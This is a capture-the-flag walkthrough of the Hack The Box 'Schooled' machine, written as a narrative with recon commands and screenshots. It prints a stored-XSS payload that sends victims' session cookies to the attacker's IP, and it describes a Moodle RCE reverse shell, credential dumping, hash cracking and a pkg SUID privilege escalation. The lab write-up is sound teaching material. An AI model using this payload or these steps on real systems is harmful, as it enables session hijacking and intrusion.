I started with an `Nmap` scan to detect open ports on the machine.

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/HTB/Schooled/machine]
â””â”€# nmap -sS --min-rate=5000 -vvv -n -Pn --open 10.10.10.234 -oN targeted

I did another scan to detect the version of each open port.

```bash

I had two ports open, the first was for the `SSH` service and the other was a web server, there was little I could do on the first one so I resorted to seeing what was on the web server.

Apparently it was a school page, I investigated it a little more and found the following in the "footer" of the website.

![https://imgur.com/Vnl3TCA.png](https://imgur.com/Vnl3TCA.png)

This caught my attention, I thought that `virtual hosting` could be applied, that is, hosting different domains on a single 'IP', so I entered it in `/etc/hosts`.

![https://imgur.com/9V1ffkh.png](https://imgur.com/9V1ffkh.png)

I went back to the website, but there was nothing interesting.

![https://imgur.com/LXCKb0F.png](https://imgur.com/LXCKb0F.png)

I used `whatweb` to see if it was running any `CMS`.

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/HTB/Schooled/machine]
â””â”€# whatweb http://schooled.htb/
http://schooled.htb/ [200 OK] Apache[2.4.46], Bootstrap, Country[RESERVED][ZZ], Email[#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46 (FreeBSD) PHP/7.4.15], IP[10.10.10.234], PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute], X-UA-Compatible[IE=edge]
```

Apparently it was the same one, so I did some subdomain fuzzing and found one that caught my attention.

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/HTB/Schooled/machine]
â””â”€# wfuzz -c --hc=404 -u http://schooled.htb/ -H "Host: FUZZ.schooled.htb" -w /usr/share/amass/wordlists/subdomains.lst -t 20 --hw=1555

`Moodle` was a subdomain that I was apparently using, I entered it in the `/etc/hosts`.

![https://imgur.com/OShD4Q5.png](https://imgur.com/OShD4Q5.png)

And the page tells me something different, it was a `moodle`.

![https://imgur.com/tCieGJx.png](https://imgur.com/tCieGJx.png)

It had a button that said `Log In`, clicking it redirected me to a login page.

![https://imgur.com/dvEEVpA.png](https://imgur.com/dvEEVpA.png)

I had no credentials so there was little I could do, but I could register.

![https://imgur.com/W3FR84S.png](https://imgur.com/W3FR84S.png)

Once registered, I logged in.

![https://imgur.com/OnSim3m.png](https://imgur.com/OnSim3m.png)

Looking at all the subjects that were available, `mathematics` was the only one that had a user named 'Manuel Philips'.

![https://imgur.com/3VUKpya.png](https://imgur.com/3VUKpya.png)

I found a comment from this user.

![Untitled (4) (1)](https://user-images.githubusercontent.com/69093629/133931890-edc2a9ae-3ac4-4e6e-a0a9-0caf666843f0.png)

What caught my attention the most was that it says to verify all users, looking a little more at the page I found this `buffer` that apparently allowed me to talk to `Manuel Philips`, I tried to see if it was vulnerable to `XSS`.

![Sin tÃ­tulo (1) (2) (1)](https://user-images.githubusercontent.com/69093629/133931959-b6273540-4006-4950-8f7f-042e62dc398f.png)

And the alert was reported to me on the screen.

![https://imgur.com/OpYC8nU.png](https://imgur.com/OpYC8nU.png)

Now that I knew it was vulnerable to `XSS` I remembered the message that said all users would be verified, I thought about performing a `Cookie Hijacking`, that is, stealing the session `cookie` of the privileged user, to do this I used the following syntax in `JS`.

```js
<script>document.location="http://10.10.16.3/value_cookie="+document.cookie</script>
```

It can actually be done in many ways.

![https://imgur.com/upgz0Co.png](https://imgur.com/upgz0Co.png)

I opened a server via `Python` and received my session `cookie` via `GET` plus others that were not mine.

![https://imgur.com/gYNFMRR.png](https://imgur.com/gYNFMRR.png)

I authenticated with the `cookie` I received and it seemed to be from the user `Manuel Philips`, going back to the previous message, I saw that it said something about `MoodleNet`, I decided to investigate and found a `Lanz` exploit that guarantees you `RCE`.

![Captura de pantalla (2)](https://user-images.githubusercontent.com/69093629/133928030-748d5a80-0d9f-4ed9-be5d-0d78952340d3.png)

I run it by giving it the session cookie of user `Manuel Philips` and running a reverse shell through `mkfifo` and gaining access to the machine.

![https://imgur.com/JpUx8Ox.png](https://imgur.com/JpUx8Ox.png)

Investigating the machine I found a file called `config.php` that had `MySQL` credentials.

![https://imgur.com/r590xtu.png](https://imgur.com/r590xtu.png)

Before using `MySQL` I used the `MySQLshow` utility to list the databases and their tables.

![Qm7IKtT](https://user-images.githubusercontent.com/69093629/133929540-2504f516-0097-41ca-9ca8-e896e68c1dd1.png)

After enumerating the `Moodle` database I found a special table called `mdl_user`, enumerating it I found different columns, but I was especially struck by "username", "password" and "email", after enumerating them I was given different `hashes` of users.

![https://imgur.com/CBBvwrR.png](https://imgur.com/CBBvwrR.png)

I decided to crack the `hashes` with `john` locally and I managed to crack the `!QAZ2wsx` credential which belonged to the user `jamie`, as the machine had `SSH` open I tried to authenticate with these credentials and I accessed, I could now view the user's "flag".

<h1 align="center"><b>ESCALADA DE PRIVILEGIOS</b></h1>

Doing `sudo -l` I saw that I could run `pkg` as any user.

![https://imgur.com/5rV3sG0.png](https://imgur.com/5rV3sG0.png)

I headed over to [gtfobins](https://gtfobins.github.io) and found a payload that allowed me to escalate privileges.

![https://imgur.com/EjF0tv9.png](https://imgur.com/EjF0tv9.png)

On the victim machine I didn't have `fpm` installed, so I did it on my machine, made it grant `SUID` privileges to `bash`, transferred it to the victim machine and ran it, and I could now see the `root` flag.
